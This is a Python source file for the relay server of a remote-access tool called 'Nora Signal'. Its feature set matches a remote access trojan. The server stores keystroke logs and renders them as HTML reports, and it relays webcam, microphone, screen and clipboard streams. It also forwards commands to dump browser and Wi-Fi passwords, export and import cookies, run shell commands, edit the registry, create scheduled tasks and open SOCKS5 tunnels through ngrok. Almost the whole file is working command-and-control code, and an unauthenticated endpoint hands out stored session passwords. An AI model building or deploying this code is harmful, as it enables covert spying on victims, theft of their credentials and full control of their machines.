"""
Nora Signal relay server.

Agents (PC clients) connect and emit:
  register        {"name": "<hostname>"}
  frame           {"data": "<base64 jpeg>"}
  key             {"char": "<key>", "time": "HH:MM:SS", "app": "..."}
  camera_frame    {"data": "<base64 jpeg>"}
  clipboard       {"text": "<text>"}

Hubs (viewers) connect and emit:
  hub_join        {}
  command         {"action":..., "_target": "<agent name>"}

The relay forwards agent events to all hubs (adding "_agent" key),
and hub commands to the named target agent.

Keylogs are stored to disk at NORA_KEYLOG_DIR (default: ./keylogs/).
GET /keylogs/<agent>  → standalone HTML report
GET /keylogs          → list all agents with saved keylogs
"""

from flask import Flask, send_from_directory, request as freq, Response, jsonify
from flask_socketio import SocketIO, emit, join_room
import os
import json
import time
import datetime
import base64
import hashlib
import socket as _rawsock
import struct
import threading

_DIR = os.path.dirname(os.path.abspath(__file__))
_KEYLOG_DIR = os.environ.get("NORA_KEYLOG_DIR", os.path.join(_DIR, "keylogs"))
os.makedirs(_KEYLOG_DIR, exist_ok=True)

app = Flask(__name__, static_folder=_DIR)
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    max_http_buffer_size=10 * 1024 * 1024,
    ping_timeout=60,
    ping_interval=25,
)

agents = {}       # sid -> {"name": str, "secret": str}
name_to_sid = {}  # name -> sid
hub_secrets = {}  # hub_sid -> secret
_fastcap_cache = {}  # agent_name -> last fastcap_info dict
HUB_ROOM = "hubs"

_frame_last_fwd  = {}   # agent_name -> last forwarded time (JPEG throttle)
_FRAME_THROTTLE  = 0.1  # forward at most 10 fps per agent


def _hub_room(secret):
    """Room name for hubs sharing a secret."""
    return f"hubs:{secret}" if secret else HUB_ROOM


def _agent_list(secret=None):
    """Return agents visible to a given secret (or all if no secret filtering)."""
    return [
        {"name": v["name"]}
        for v in agents.values()
        if secret is None or v.get("secret", "") == secret
    ]


def _agent_secret(target_name):
    """Get the secret of a named agent."""
    sid = name_to_sid.get(target_name)
    if sid:
        return agents.get(sid, {}).get("secret", "")
    return None


def _hub_may_reach(hub_sid, target_name):
    """True if the hub's secret matches the target agent's secret."""
    hub_secret = hub_secrets.get(hub_sid, "")
    agent_secret = _agent_secret(target_name)
    return agent_secret is not None and hub_secret == agent_secret


def _keylog_path(agent_name):
    safe = "".join(c if c.isalnum() or c in "-_." else "_" for c in agent_name)
    return os.path.join(_KEYLOG_DIR, f"{safe}.jsonl")


def _append_keylog(agent_name, event):
    """Append a key event to the agent's JSONL log file."""
    try:
        event["_ts"] = time.time()
        with open(_keylog_path(agent_name), "a", encoding="utf-8") as f:
            f.write(json.dumps(event, ensure_ascii=False) + "\n")
    except Exception:
        pass


def _load_keylogs(agent_name):
    path = _keylog_path(agent_name)
    if not os.path.exists(path):
        return []
    events = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        events.append(json.loads(line))
                    except Exception:
                        pass
    except Exception:
        pass
    return events


def _reconstruct_text(chars):
    """Turn a list of char strings into readable text, applying backspaces."""
    result = []
    for ch in chars:
        if ch == "⌫":
            if result:
                result.pop()
        elif ch == "↵":
            result.append("\n")
        else:
            result.append(ch)
    return "".join(result)


def _build_keylog_html(agent_name):
    """Build a beautiful standalone HTML keylog report."""
    events = _load_keylogs(agent_name)

    # Group into app sessions: consecutive events with same app = one session
    sessions = []
    current_app = None
    current_session = None
    for ev in events:
        app_name = ev.get("app", "Unknown")
        char = ev.get("char", "")
        ts = ev.get("time", "")
        srv_ts = ev.get("_ts", 0)
        if app_name != current_app:
            if current_session:
                sessions.append(current_session)
            current_app = app_name
            current_session = {
                "app": app_name,
                "start_time": ts,
                "start_ts": srv_ts,
                "chars": [],
                "events": [],
            }
        if current_session is not None:
            current_session["chars"].append(char)
            current_session["events"].append(ev)
    if current_session:
        sessions.append(current_session)

    # Build session HTML blocks
    session_blocks = []
    for i, sess in enumerate(sessions):
        text = _reconstruct_text(sess["chars"])
        text_html = ""
        for line in text.split("\n"):
            # Wrap special chars
            span_chars = []
            for ch in line:
                if ch in ("⇥", "↵", "⌫", "⎋", "⌦", "⇞", "⇟", "↑", "↓", "←", "→"):
                    span_chars.append(f'<span class="sp-key">{ch}</span>')
                else:
                    span_chars.append(ch.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
            text_html += "<div class='typed-line'>" + ("".join(span_chars) or "&nbsp;") + "</div>"

        raw_count = len(sess["chars"])
        dt_str = ""
        if sess.get("start_ts"):
            try:
                dt_str = datetime.datetime.fromtimestamp(sess["start_ts"]).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                dt_str = sess.get("start_time", "")

        app_parts = sess["app"].split(" — ", 1)
        proc_name = app_parts[0]
        win_title = app_parts[1] if len(app_parts) > 1 else ""

        session_blocks.append(f"""
        <div class="session-card" id="s{i}">
          <div class="session-header">
            <div class="session-app">
              <span class="proc-badge">{proc_name.replace("&","&amp;").replace("<","&lt;")}</span>
              {f'<span class="win-title">{win_title.replace("&","&amp;").replace("<","&lt;")}</span>' if win_title else ""}
            </div>
            <div class="session-meta">
              <span class="meta-time">{dt_str}</span>
              <span class="meta-count">{raw_count} keys</span>
            </div>
          </div>
          <div class="session-body">
            <div class="typed-text">{text_html if text_html else '<span class="no-text">— no printable text —</span>'}</div>
          </div>
        </div>""")

    sessions_html = "\n".join(session_blocks) if session_blocks else '<div class="empty-state">No keylog data recorded yet.</div>'

    total_keys = sum(len(s["chars"]) for s in sessions)
    unique_apps = len(set(s["app"] for s in sessions))
    first_ts = ""
    last_ts = ""
    if events:
        try:
            first_ts = datetime.datetime.fromtimestamp(events[0].get("_ts", 0)).strftime("%Y-%m-%d %H:%M")
            last_ts = datetime.datetime.fromtimestamp(events[-1].get("_ts", 0)).strftime("%Y-%m-%d %H:%M")
        except Exception:
            pass

    generated = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Keylog Report — {agent_name}</title>
<style>
  :root {{
    --bg: #f8fafc;
    --card: #ffffff;
    --border: #e2e8f0;
    --accent: #6366f1;
    --accent2: #8b5cf6;
    --text: #0f172a;
    --muted: #64748b;
    --proc: #dbeafe;
    --proc-text: #1e40af;
    --sp-key: #7c3aed;
    --green: #059669;
    --shadow: 0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.04);
    --shadow-lg: 0 10px 25px rgba(0,0,0,.08);
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--bg);
    color: var(--text);
    line-height: 1.6;
  }}
  .top-bar {{
    background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
    color: #fff;
    padding: 24px 32px;
  }}
  .top-bar h1 {{ font-size: 1.5rem; font-weight: 700; letter-spacing: -0.02em; }}
  .top-bar .subtitle {{ opacity: 0.8; font-size: 0.9rem; margin-top: 2px; }}
  .stats-row {{
    display: flex; gap: 16px; flex-wrap: wrap;
    padding: 20px 32px;
    background: var(--card);
    border-bottom: 1px solid var(--border);
  }}
  .stat-pill {{
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 999px;
    padding: 6px 16px;
    font-size: 0.82rem;
    color: var(--muted);
  }}
  .stat-pill strong {{ color: var(--text); }}
  .main {{ max-width: 960px; margin: 0 auto; padding: 24px 16px; }}
  .section-title {{
    font-size: 0.75rem; font-weight: 700; text-transform: uppercase;
    letter-spacing: 0.1em; color: var(--muted); margin-bottom: 12px;
  }}
  .session-card {{
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    margin-bottom: 12px;
    box-shadow: var(--shadow);
    overflow: hidden;
  }}
  .session-header {{
    display: flex; justify-content: space-between; align-items: flex-start;
    gap: 12px;
    padding: 14px 18px;
    background: #f1f5f9;
    border-bottom: 1px solid var(--border);
  }}
  .session-app {{ display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }}
  .proc-badge {{
    background: var(--proc); color: var(--proc-text);
    font-size: 0.78rem; font-weight: 700;
    padding: 3px 10px; border-radius: 6px;
    font-family: "SF Mono", "Fira Code", monospace;
  }}
  .win-title {{
    font-size: 0.82rem; color: var(--muted);
    max-width: 400px;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }}
  .session-meta {{
    display: flex; flex-direction: column; align-items: flex-end; gap: 2px;
    flex-shrink: 0;
  }}
  .meta-time {{ font-size: 0.75rem; color: var(--muted); }}
  .meta-count {{
    font-size: 0.72rem; font-weight: 600;
    background: #e0e7ff; color: var(--accent);
    padding: 2px 8px; border-radius: 999px;
  }}
  .session-body {{ padding: 14px 18px; }}
  .typed-text {{
    font-family: "SF Mono", "Fira Code", "Cascadia Code", monospace;
    font-size: 0.88rem;
    line-height: 1.8;
    word-break: break-all;
  }}
  .typed-line {{ min-height: 1.8em; }}
  .sp-key {{
    display: inline-block;
    background: #f3e8ff;
    color: var(--sp-key);
    border-radius: 4px;
    padding: 0 4px;
    font-size: 0.82em;
    margin: 0 1px;
  }}
  .no-text {{ color: var(--muted); font-style: italic; font-size: 0.85rem; }}
  .empty-state {{
    text-align: center; padding: 60px 20px;
    color: var(--muted); font-size: 1rem;
  }}
  .footer {{
    text-align: center; padding: 32px 16px;
    color: var(--muted); font-size: 0.78rem;
  }}
  @media (max-width: 600px) {{
    .top-bar {{ padding: 16px; }}
    .stats-row {{ padding: 12px 16px; gap: 8px; }}
    .session-header {{ flex-direction: column; gap: 8px; }}
    .session-meta {{ align-items: flex-start; }}
    .win-title {{ max-width: 100%; white-space: normal; }}
  }}
</style>
</head>
<body>
<div class="top-bar">
  <h1>Keylog Report</h1>
  <div class="subtitle">Agent: {agent_name} &nbsp;·&nbsp; Generated {generated}</div>
</div>
<div class="stats-row">
  <div class="stat-pill"><strong>{total_keys:,}</strong> total keystrokes</div>
  <div class="stat-pill"><strong>{len(sessions)}</strong> app sessions</div>
  <div class="stat-pill"><strong>{unique_apps}</strong> unique apps</div>
  {f'<div class="stat-pill">From <strong>{first_ts}</strong> to <strong>{last_ts}</strong></div>' if first_ts else ""}
</div>
<div class="main">
  <div class="section-title">App Sessions — chronological</div>
  {sessions_html}
</div>
<div class="footer">Nora Monitor · Keylog Report</div>
</body>
</html>"""


@app.route("/")
def index():
    return send_from_directory(_DIR, "hub.html")


@app.route("/hub.html")
def hub_html():
    return send_from_directory(_DIR, "hub.html")


@app.route("/keylogs")
def keylog_index():
    agents_with_logs = []
    try:
        for fname in os.listdir(_KEYLOG_DIR):
            if fname.endswith(".jsonl"):
                agent = fname[:-6]
                path = os.path.join(_KEYLOG_DIR, fname)
                size = os.path.getsize(path)
                mtime = os.path.getmtime(path)
                agents_with_logs.append({
                    "agent": agent,
                    "size": size,
                    "last_updated": datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S"),
                })
    except Exception:
        pass
    return jsonify(agents_with_logs)


@app.route("/keylogs/<path:agent_name>")
def keylog_report(agent_name):
    html = _build_keylog_html(agent_name)
    return Response(html, mimetype="text/html")


@app.route("/api/fc_pw")
def api_fc_pw():
    """Return fastcap session+password. Pass ?agent=NAME to get a specific agent."""
    want = freq.args.get("agent", "").strip()
    for name, info in list(_fastcap_cache.items()):
        if not info.get("password"):
            continue
        if want and name.lower() != want.lower():
            continue
        return jsonify({"session": info.get("session"), "password": info.get("password"), "agent": name})
    if want:
        return jsonify({"error": f"agent '{want}' not found or not registered"}), 404
    return jsonify({"error": "no fastcap agent registered"}), 404


@app.route("/api/status")
def api_status():
    now = time.time()
    fc_debug = {}
    with _fc_lock:
        for sid_bytes, s in _fc_sessions.items():
            fc_debug[sid_bytes.hex()] = {
                "host_alive":   _fc_host_alive(s),
                "host_addr":    str(s.host_addr) if s.host_addr else None,
                "host_last_seen": round(now - s.host_time, 1) if s.host_time else None,
                "viewer_count": len(s.viewer_addrs),
                "viewer_addrs": [str(a) for a in s.viewer_addrs],
            }
    return jsonify({
        "agents": list(agents.values()),
        "fastcap_cache": {k: {ek: ev for ek, ev in v.items() if ek != "password"} for k, v in _fastcap_cache.items()},
        "fc_sessions": fc_debug,
    })


# ── Agent registration ────────────────────────────────────────────────────────

@socketio.on("register")
def on_register(data):
    sid = freq.sid
    name = str(data.get("name", "agent"))
    secret = str(data.get("secret", ""))
    agents[sid] = {"name": name, "secret": secret}
    name_to_sid[name] = sid
    emit("registered", {"name": name})
    socketio.emit("agent_list", _agent_list(secret), room=_hub_room(secret))


# ── Hub join ──────────────────────────────────────────────────────────────────

@socketio.on("hub_join")
def on_hub_join(data=None):
    secret = str((data or {}).get("secret", ""))
    hub_secrets[freq.sid] = secret
    join_room(_hub_room(secret))
    emit("agent_list", _agent_list(secret))
    # Re-deliver cached fastcap_info for any connected agent visible to this hub
    redelivered = 0
    for ag_name, fc_info in list(_fastcap_cache.items()):
        ag_secret = _agent_secret(ag_name)
        if ag_secret is not None and ag_secret == secret:
            emit("fastcap_info", fc_info)
            redelivered += 1
    print(f"[fc] hub_join from sid={freq.sid} secret='{secret}' — re-delivered fastcap_info x{redelivered}", flush=True)


# ── Disconnect ────────────────────────────────────────────────────────────────

@socketio.on("disconnect")
def on_disconnect():
    sid = freq.sid
    hub_secrets.pop(sid, None)
    info = agents.pop(sid, None)
    if info:
        if name_to_sid.get(info["name"]) == sid:
            del name_to_sid[info["name"]]
        _fastcap_cache.pop(info["name"], None)
        secret = info.get("secret", "")
        socketio.emit("agent_list", _agent_list(secret), room=_hub_room(secret))


# ── Agent → Hub forwarding ────────────────────────────────────────────────────

def _make_fwd(event):
    def _handler(data):
        sid = freq.sid
        if not isinstance(data, dict):
            data = {}
        agent_info = agents.get(sid, {})
        agent_name = agent_info.get("name", "?")
        secret = agent_info.get("secret", "")
        data["_agent"] = agent_name
        if event == "key":
            _append_keylog(agent_name, dict(data))
        if event == "fastcap_info":
            _fastcap_cache[agent_name] = dict(data)
            print(f"[fc] fastcap_info cached: agent={agent_name} session={data.get('session','?')[:8]}… pw_len={len(str(data.get('password','')))}", flush=True)
        # Throttle JPEG frames to avoid flooding the hub WebSocket buffer
        if event == "frame":
            now = time.time()
            if now - _frame_last_fwd.get(agent_name, 0) < _FRAME_THROTTLE:
                return
            _frame_last_fwd[agent_name] = now
        socketio.emit(event, data, room=_hub_room(secret))
    _handler.__name__ = f"fwd_{event}"
    return _handler

for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio", "win_frame",
            "shell_started", "shell_output", "fastcap_info"):
    socketio.on(_ev)(_make_fwd(_ev))


# ── Hub → Agent commands ──────────────────────────────────────────────────────

def _to_agent(data, event=None):
    target_name = data.get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(freq.sid, target_name):
        ev = event or "command"
        socketio.emit(ev, data, room=target_sid)


@socketio.on("command")
def on_command(data):
    _to_agent(data, "command")


# Simple hub→agent forwards (no req/resp, no response routed back)
for _cmd in ("camera_on", "camera_off", "mic_on", "mic_off",
             "keylog_on", "keylog_off",
             "shell_start", "shell_input", "shell_stop",
             "webrtc_answer", "webrtc_stop",
             "pause_screen", "resume_screen",
             "start_screen_stream", "stop_screen_stream"):
    def _make_cmd_handler(ev):
        def _h(data):
            _to_agent(data, ev)
        _h.__name__ = f"cmd_{ev}"
        return _h
    socketio.on(_cmd)(_make_cmd_handler(_cmd))


# keylog_status: agent → requester (response to keylog_on / keylog_off)
@socketio.on("keylog_status")
def on_keylog_status(data):
    requester = (data or {}).get("_requester")
    if requester:
        socketio.emit("keylog_status", data, room=requester)


# privacy_start / privacy_stop: hub → agent (forward with _requester)
for _pev in ("privacy_start", "privacy_stop"):
    def _make_priv_handler(ev):
        def _h(data):
            target_name = (data or {}).get("_target")
            target_sid = name_to_sid.get(target_name)
            if target_sid and _hub_may_reach(freq.sid, target_name):
                payload = dict(data) if data else {}
                payload["_requester"] = freq.sid
                socketio.emit(ev, payload, room=target_sid)
        _h.__name__ = f"priv_{ev}"
        return _h
    socketio.on(_pev)(_make_priv_handler(_pev))

# privacy_result: agent → requester (single response handler for both start and stop)
@socketio.on("privacy_result")
def on_privacy_result(data):
    requester = (data or {}).get("_requester")
    if requester:
        socketio.emit("privacy_result", data, room=requester)


# ── Process list (request/response) ──────────────────────────────────────────

@socketio.on("get_processes")
def on_get_processes(data):
    requester = freq.sid
    target_name = data.get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(requester, target_name):
        socketio.emit("get_processes", {"_requester": requester}, room=target_sid)


@socketio.on("processes_result")
def on_processes_result(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("processes_result", data, room=requester)


@socketio.on("kill_process")
def on_kill_process(data):
    target_name = data.get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(freq.sid, target_name):
        socketio.emit("kill_process", data, room=target_sid)


# ── File manager (request/response) ──────────────────────────────────────────

def _fm_request(event, data):
    target_name = data.get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(freq.sid, target_name):
        data["_requester"] = freq.sid
        socketio.emit(event, data, room=target_sid)

for _fmev in ("list_dir", "read_file", "write_file", "delete_path",
               "rename_path", "copy_path", "move_path",
               "upload_start", "upload_chunk"):
    def _make_fm_handler(ev):
        def _h(data):
            _fm_request(ev, data)
        _h.__name__ = f"fm_{ev}"
        return _h
    socketio.on(_fmev)(_make_fm_handler(_fmev))


def _fm_response(event, data):
    requester = data.get("_requester")
    if requester:
        socketio.emit(event, data, room=requester)

for _rsev in ("dir_result", "file_data", "write_result", "delete_result",
               "rename_result", "copy_result", "move_result",
               "upload_ready", "upload_progress"):
    def _make_rs_handler(ev):
        def _h(data):
            _fm_response(ev, data)
        _h.__name__ = f"rs_{ev}"
        return _h
    socketio.on(_rsev)(_make_rs_handler(_rsev))


# ── Cookie manager (request/response) ────────────────────────────────────────

@socketio.on("export_cookies")
def on_export_cookies(data):
    target_name = (data or {}).get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(freq.sid, target_name):
        socketio.emit("export_cookies", {"_requester": freq.sid}, room=target_sid)

@socketio.on("cookies_data")
def on_cookies_data(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("cookies_data", data, room=requester)

@socketio.on("import_cookies")
def on_import_cookies(data):
    target_name = (data or {}).get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(freq.sid, target_name):
        data["_requester"] = freq.sid
        socketio.emit("import_cookies", data, room=target_sid)

@socketio.on("import_result")
def on_import_result(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("import_result", data, room=requester)


# ── Window / desktop control (request/response) ───────────────────────────────

@socketio.on("list_windows")
def on_list_windows(data):
    requester = freq.sid
    target_name = data.get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(requester, target_name):
        socketio.emit("list_windows", {"_requester": requester}, room=target_sid)

@socketio.on("windows_list")
def on_windows_list(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("windows_list", data, room=requester)

for _wcev in ("win_key", "win_mouse", "desktop_cmd", "win_capture_start", "win_capture_stop"):
    def _make_wc_handler(ev):
        def _h(data):
            target_name = data.get("_target")
            target_sid = name_to_sid.get(target_name)
            if target_sid and _hub_may_reach(freq.sid, target_name):
                socketio.emit(ev, data, room=target_sid)
        _h.__name__ = f"wc_{ev}"
        return _h
    socketio.on(_wcev)(_make_wc_handler(_wcev))


# ── System info / history / screenshot / clipboard (request/response) ────

def _make_req_resp(req_event, resp_event):
    def _on_req(data):
        target_name = (data or {}).get("_target")
        target_sid = name_to_sid.get(target_name)
        if target_sid and _hub_may_reach(freq.sid, target_name):
            payload = dict(data) if data else {}
            payload["_requester"] = freq.sid
            socketio.emit(req_event, payload, room=target_sid)
    _on_req.__name__ = f"rr_{req_event}"
    socketio.on(req_event)(_on_req)

    def _on_resp(data):
        requester = (data or {}).get("_requester")
        if requester:
            socketio.emit(resp_event, data, room=requester)
    _on_resp.__name__ = f"rr_{resp_event}"
    socketio.on(resp_event)(_on_resp)

for _rr in [
    ("get_sysinfo", "sysinfo_result"),
    ("get_history", "history_result"),
    ("take_screenshot", "screenshot_result"),
    ("clipboard_set", "clipboard_set_result"),
    ("send_notification", "notification_result"),
    ("get_wallpaper", "wallpaper_result"),
    ("set_wallpaper", "set_wallpaper_result"),
    ("get_programs", "programs_result"),
    ("get_netconns", "netconns_result"),
    ("get_startup", "startup_result"),
    ("remove_startup", "remove_startup_result"),
    ("volume_control", "volume_result"),
    ("get_monitors", "monitors_result"),
    # New features
    ("power_action",           "power_result"),
    ("desktop_mouse",          "desktop_mouse_result"),
    ("desktop_type",           "desktop_type_result"),
    ("run_command",            "command_result"),
    ("upload_file",            "upload_result"),
    ("get_wifi_passwords",     "wifi_passwords_result"),
    ("webcam_snapshot",        "webcam_snapshot_result"),
    ("get_active_window",      "active_window_result"),
    ("start_recording",        "recording_started"),
    ("stop_recording",         "recording_result"),
    ("get_drives",             "drives_result"),
    ("search_files",           "search_result"),
    ("get_event_logs",         "event_logs_result"),
    ("registry_get",           "registry_result"),
    ("registry_set",           "set_registry_result"),
    ("get_env_vars",           "env_vars_result"),
    ("get_users",              "users_result"),
    ("get_scheduled_tasks",    "scheduled_tasks_result"),
    ("create_scheduled_task",  "create_task_result"),
    ("delete_scheduled_task",  "delete_task_result"),
    ("play_audio",             "audio_play_result"),
    ("get_clipboard_history",  "clipboard_history_result"),
    ("lan_scan",               "lan_scan_result"),
    ("get_dns_cache",          "dns_cache_result"),
    ("get_browser_passwords",  "browser_passwords_result"),
    ("force_update",           "force_update_result"),
    # WebRTC signaling: hub requests offer, agent responds with SDP offer
    ("webrtc_request",         "webrtc_offer"),
    # fastcap on-demand streaming
    ("fastcap_start",          "fastcap_start_result"),
    ("fastcap_stop",           "fastcap_stop_result"),
]:
    _make_req_resp(*_rr)


# ── SOCKS5 proxy control (hub → agent → hub) ─────────────────────────────────

def _socks5_to_agent(event, data):
    target_name = (data or {}).get("_target")
    target_sid  = name_to_sid.get(target_name)
    if target_sid and _hub_may_reach(freq.sid, target_name):
        payload = dict(data) if data else {}
        payload["_requester"] = freq.sid
        socketio.emit(event, payload, room=target_sid)

@socketio.on("start_socks5")
def on_start_socks5(data):
    _socks5_to_agent("start_socks5", data)

@socketio.on("stop_socks5")
def on_stop_socks5(data):
    _socks5_to_agent("stop_socks5", data)

@socketio.on("get_socks5_status")
def on_get_socks5_status(data):
    _socks5_to_agent("get_socks5_status", data)

@socketio.on("save_ngrok_token")
def on_save_ngrok_token(data):
    _socks5_to_agent("save_ngrok_token", data)

@socketio.on("socks5_result")
def on_socks5_result(data):
    requester = (data or {}).get("_requester")
    if requester:
        socketio.emit("socks5_result", data, room=requester)

@socketio.on("socks5_status_result")
def on_socks5_status_result(data):
    requester = (data or {}).get("_requester")
    if requester:
        socketio.emit("socks5_status_result", data, room=requester)


# ── Fastcap UDP relay — merged onto port 5000 UDP ────────────────────────────
# UDP 5000 and TCP 5000 are independent OS-level sockets; no conflict.
# Video frames arrive from the PC as UDP datagrams → reassembled → emitted
# as Socket.IO binary events to the hub room.  Input (mouse/keyboard) arrives
# as Socket.IO events from the browser → forwarded to the PC as UDP.

_FC_UDP_PORT = int(os.environ.get("FC_UDP_PORT", 5000))
FC_TIMEOUT   = 30

T_HELLO_HOST, T_HELLO_VIEW, T_VIDEO, T_INPUT, T_KEYREQ, T_PING = 1, 2, 3, 4, 5, 6

_fc_sessions    = {}   # sid(bytes) -> _FcSession
_fc_sid_to_agent= {}   # sid_hex   -> agent_name
_fc_udp_sock    = None
_fc_lock        = threading.Lock()



def _fc_is_keyframe(data):
    i = data.find(b"\x00\x00\x01")
    while i != -1 and i + 3 < len(data):
        if data[i + 3] & 0x1F in (5, 7):
            return True
        i = data.find(b"\x00\x00\x01", i + 3)
    return False


class _FcSession:
    def __init__(self):
        self.host_addr   = None
        self.host_time   = 0.0
        self.frames      = {}
        self.next_id     = None
        self.last_keyreq = 0.0
        self.token       = None   # viewer auth token
        self.wait_key    = True
        self.viewer_addrs = {}    # addr -> last_seen_time (UDP desktop viewers)


def _fc_sess(sid):
    with _fc_lock:
        s = _fc_sessions.get(sid)
        if s is None:
            s = _fc_sessions[sid] = _FcSession()
        return s


def _fc_host_alive(s):
    return s.host_addr is not None and time.time() - s.host_time < FC_TIMEOUT


def _fc_send_to_host(s, sid, t, token=None, payload=b""):
    if _fc_host_alive(s) and _fc_udp_sock:
        tok = token or (b"\x00" * 8)
        try:
            _fc_udp_sock.sendto(bytes([t]) + sid + tok + payload, s.host_addr)
        except Exception:
            pass


def _fc_request_key(s, sid):
    now = time.time()
    if now - s.last_keyreq < 0.3:
        return
    s.last_keyreq = now
    _fc_send_to_host(s, sid, T_KEYREQ, s.token)


def _fc_to_socketio(s, sid, pkt):
    """Reassemble fragmented H.264 frame and emit to hub room via Socket.IO."""
    fid, idx, cnt = struct.unpack(">IHH", pkt[9:17])
    if s.next_id is not None and fid < s.next_id and s.next_id - fid < 1000:
        return
    f = s.frames.setdefault(fid, [cnt, {}])
    f[1][idx] = pkt[17:]
    if len(f[1]) != cnt:
        if len(s.frames) > 60:
            s.frames.clear()
        return
    frame_data = b"".join(f[1][i] for i in range(cnt))
    lost = s.next_id is not None and fid > s.next_id
    for old in [k for k in s.frames if k <= fid]:
        del s.frames[old]
    s.next_id = fid + 1

    key = _fc_is_keyframe(frame_data)
    if lost or (s.wait_key and not key):
        s.wait_key = True
        _fc_request_key(s, sid)
        return
    s.wait_key = False

    sid_hex = sid.hex()
    ag_name = _fc_sid_to_agent.get(sid_hex)
    if not ag_name:
        for name, info in list(_fastcap_cache.items()):
            stored = info.get("session", "")
            # Accept both: exact match or wire-SID match (ASCII bytes of stored[:8])
            if stored == sid_hex or stored[:8].encode("ascii", "replace").hex() == sid_hex:
                _fc_sid_to_agent[sid_hex] = name
                ag_name = name
                break
    if not ag_name:
        print(f"[fc_vid] DROP: no agent mapped for sid_hex={sid_hex}", flush=True)
        return

    ag_secret = _agent_secret(ag_name)
    if ag_secret is None:
        print(f"[fc_vid] DROP: agent {ag_name} has no secret", flush=True)
        return
    room = _hub_room(ag_secret)
    msg = bytes([1 if key else 0]) + frame_data
    socketio.emit("fastcap_video", {"s": sid_hex, "d": msg, "b64": base64.b64encode(msg).decode()}, room=room)
    # Sampled log to avoid flooding — print every 60th frame
    _fc_emit_count = getattr(_fc_to_socketio, "_count", 0) + 1
    _fc_to_socketio._count = _fc_emit_count
    if _fc_emit_count % 60 == 1:
        print(f"[fc_vid] emit #{_fc_emit_count} agent={ag_name} room={room} key={key} size={len(msg)}", flush=True)


def _fc_udp_thread():
    global _fc_udp_sock
    sock = _rawsock.socket(_rawsock.AF_INET, _rawsock.SOCK_DGRAM)
    sock.setsockopt(_rawsock.SOL_SOCKET, _rawsock.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(_rawsock.SOL_SOCKET, _rawsock.SO_REUSEPORT, 1)
    except (AttributeError, OSError):
        pass  # SO_REUSEPORT not available on this platform
    sock.setsockopt(_rawsock.SOL_SOCKET, _rawsock.SO_RCVBUF, 8 * 1024 * 1024)
    sock.setsockopt(_rawsock.SOL_SOCKET, _rawsock.SO_SNDBUF, 8 * 1024 * 1024)
    sock.bind(("0.0.0.0", _FC_UDP_PORT))
    _fc_udp_sock = sock
    print(f"[fastcap] UDP listening on :{_FC_UDP_PORT}", flush=True)
    while True:
        try:
            data, addr = sock.recvfrom(65536)
            if len(data) < 9:
                continue
            now = time.time()
            t   = data[0]
            sid = data[1:9]
            s   = _fc_sess(sid)
            if t in (T_HELLO_HOST, T_VIDEO):
                s.host_addr = addr
                s.host_time = now
                if t == T_VIDEO:
                    # Forward raw packet directly to UDP viewers (no reassembly)
                    now2 = time.time()
                    with _fc_lock:
                        alive = {a: t2 for a, t2 in s.viewer_addrs.items() if now2 - t2 < FC_TIMEOUT}
                        s.viewer_addrs = alive
                    for viewer_addr in alive:
                        try:
                            sock.sendto(data, viewer_addr)
                        except Exception:
                            pass
                    # Also feed web/Socket.IO viewers (needs reassembly)
                    if len(data) >= 17:
                        _fc_to_socketio(s, sid, data)
            elif t == T_HELLO_VIEW and len(data) >= 17:
                # Desktop viewer authenticating via UDP
                token = data[9:17]
                sid_hex = sid.hex()
                ag_name = _fc_sid_to_agent.get(sid_hex)
                if not ag_name:
                    for name, info in list(_fastcap_cache.items()):
                        stored = info.get("session", "")
                        # fastcap.Host() encodes session as ASCII bytes (first 8 chars),
                        # so the wire SID hex is hex(session[:8].encode('ascii')), not the
                        # raw session string. Accept both forms for forward-compatibility.
                        wire_sid = stored[:8].encode("ascii", "replace").hex()
                        if wire_sid == sid_hex or stored == sid_hex:
                            _fc_sid_to_agent[sid_hex] = name
                            ag_name = name
                            break
                token_ok = False
                if ag_name:
                    fc_info = _fastcap_cache.get(ag_name, {})
                    pw = fc_info.get("password", "")
                    expected = hashlib.sha256(pw.encode() + sid_hex.encode()).digest()[:8]
                    token_ok = (token == expected)
                elif _fc_host_alive(s):
                    # No SyncHost cache entry but host is live (direct-test mode).
                    # Accept viewer; host will validate T_KEYREQ with its own password.
                    token_ok = True
                if token_ok:
                    with _fc_lock:
                        s.viewer_addrs[addr] = now
                        if s.token is None:
                            s.token = token
                        s.wait_key = True
                    try:
                        sock.sendto(bytes([T_HELLO_VIEW]) + sid, addr)
                    except Exception:
                        pass
                    _fc_request_key(s, sid)
            elif t == T_INPUT and len(data) >= 17:
                # Input packet from a UDP viewer — forward straight to host
                _fc_send_to_host(s, sid, T_INPUT, data[9:17], data[17:])
